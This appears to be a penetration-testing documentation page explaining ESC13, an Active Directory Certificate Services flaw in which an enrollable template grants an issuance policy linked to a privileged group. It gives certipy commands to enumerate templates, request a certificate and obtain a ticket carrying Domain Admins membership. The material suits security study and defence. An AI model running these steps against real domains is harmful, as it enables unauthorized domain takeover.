---
title: 'ESC13: The Issuance Policy Overlap'
description: 'ESC13: The Issuance Policy Overlap.'
---
# ESC13: The Issuance Policy Overlap

ESC13 is a bit of a brain-bender. It relies on the complex mapping of `Issuance Policies` (or Certificate Policies). 

Sometimes, organizations create Issuance Policies (like "High Assurance") and link them to specific active directory groups using the `msDS-OidToGroupLink` attribute. The idea is: if you hold a certificate with this policy OID, you are dynamically treated as a member of that linked group when you authenticate.

The vulnerability arises when a template grants an Issuance Policy that maps to a highly privileged group, but the template itself is easily enrollable by low-privileged users.

## The Attack Path

### 1. Enumerate the OID Links
First, we need to find if any Issuance Policies are linked to powerful groups.
```bash
certipy find -u 'john' -p 'Passw0rd!' -d 'domain.local' -dc-ip 192.168.100.1
```
*Look through the output for templates that grant an Issuance Policy OID which is linked to a group like `Domain Admins`.*

### 2. Request the Certificate
If we find a template (let's call it `VulnPolicyTemplate`) that grants the "High Assurance" OID, and it allows `Domain Users` to enroll, we hit the jackpot.
```bash
certipy req -u 'john' -p 'Passw0rd!' -ca 'domain-CA' -template 'VulnPolicyTemplate'
```

### 3. Authenticate
We take the resulting certificate and request a TGT. 
```bash
certipy auth -pfx 'john.pfx' -dc-ip 192.168.100.1
```
During authentication, the KDC inspects the certificate, sees the Issuance Policy OID, notices that it is linked to the `Domain Admins` group, and dynamically injects the `Domain Admins` SID into our TGT.

!!! tip
    ESC13 is essentially an access control oversight masked by complex PKI OID mappings. It proves that obscurity is not security.
